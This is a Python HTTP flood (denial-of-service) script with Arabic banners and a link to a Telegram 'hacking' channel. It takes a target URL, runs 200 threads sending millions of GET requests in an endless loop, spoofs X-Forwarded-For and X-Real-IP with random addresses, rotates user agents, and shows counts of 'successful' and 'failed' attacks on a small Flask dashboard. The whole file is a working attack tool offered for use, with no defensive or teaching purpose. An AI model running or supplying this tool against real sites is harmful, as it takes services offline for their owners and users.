import requests
from flask import Flask, render_template_string
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
from user_agent import generate_user_agent

a1 = '\x1b[1;31m'  
a3 = '\x1b[1;32m'  
a20 = '\x1b[38;5;226m' 
a22 = '\x1b[38;5;216m'  

app = Flask(__name__)
Almunharif_port_001 = 4000
print('آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم||DF♕')
Almunharif_url_002 = input(f'{a20}URL : ')
print()
print('@A_Y_TR')
print('♕♕♕ DF ♕♕♕')
print('للمزيد من الشروحات والأدوات تفضل https://t.me/Hacking080')
print(f'{a3}قم باخذ رابط الخادم وفتحه بلمتصفح لمعرفة الاحصائيات')
print()

Almunharif_success_count_003 = 0
Almunharif_failure_count_004 = 0
lock = threading.Lock()  

def Almunharif_generate_random_ip_005():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def Almunharif_send_request_with_retry_006(session, retries=3, delay=1):
    global Almunharif_success_count_003, Almunharif_failure_count_004
    Almunharif_user_agent_007 = generate_user_agent()
    Almunharif_random_ip_008 = Almunharif_generate_random_ip_005()

    Almunharif_headers_009 = {
        "User-Agent": Almunharif_user_agent_007,
        "X-Forwarded-For": Almunharif_random_ip_008,
        "X-Real-IP": Almunharif_random_ip_008
    }

    for _ in range(retries):
        try:
            response = session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5)
            if response.status_code == 200:
                with lock:
                    Almunharif_success_count_003 += 1
                return
        except requests.RequestException:
            time.sleep(delay)
    with lock:
        Almunharif_failure_count_004 += 1

def Almunharif_start_massive_attack_012():
    with ThreadPoolExecutor(max_workers=200) as executor:  # Increase the number of workers
        with requests.Session() as session:
            while True:
                try:
                    futures = [executor.submit(Almunharif_send_request_with_retry_006, session) for _ in range(10000000)]
                    for future in futures:
                        future.result()
                except Exception as e:
                    print(f"{a1}error: {e}")

@app.route('/')
def Almunharif_index_016():
    return render_template_string('''
        <html>
            <head>
                <title>احصائيات الهجمات</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        text-align: center;
                        background-color: #121212;
                        color: #e94560;
                        margin: 0;
                        padding: 0;
                    }
                    h1 {
                        margin-top: 50px;
                        font-size: 48px;
                        color: #21bf73;
                        text-shadow: 2px 2px 4px #000000;
                    }
                    p {
                        font-size: 24px;
                        margin: 10px 0;
                    }
                    .stats {
                        margin-top: 30px;
                        padding: 20px;
                        background: #1f4068;
                        border-radius: 10px;
                        display: inline-block;
                        box-shadow: 0 0 20px #e94560;
                    }
                    .footer {
                        margin-top: 50px;
                        font-size: 18px;
                        color: #d1d1d1;
                    }
                </style>
            </head>
            <body>
                <h1>احصائيات الهجمات</h1>
                <div class="stats">
                    <p><strong>الهجمات الناجحة:</strong> {{ Almunharif_success_count_003 }}</p>
                    <p><strong>الهجمات الفاشلة:</strong> {{ Almunharif_failure_count_004 }}</p>
                </div>
                <div class="footer">
                    <p>للمزيد من الشروحات والأدوات تفضل <a href="https://t.me/Hacking080" style="color: #21bf73;">هنا</a></p>
                </div>
            </body>
        </html>
    ''', Almunharif_success_count_003=Almunharif_success_count_003, Almunharif_failure_count_004=Almunharif_failure_count_004)

Almunharif_attack_thread_017 = threading.Thread(target=Almunharif_start_massive_attack_012, daemon=True)
Almunharif_attack_thread_017.start()

if __name__ == '__main__':
    app.run(port=Almunharif_port_001)
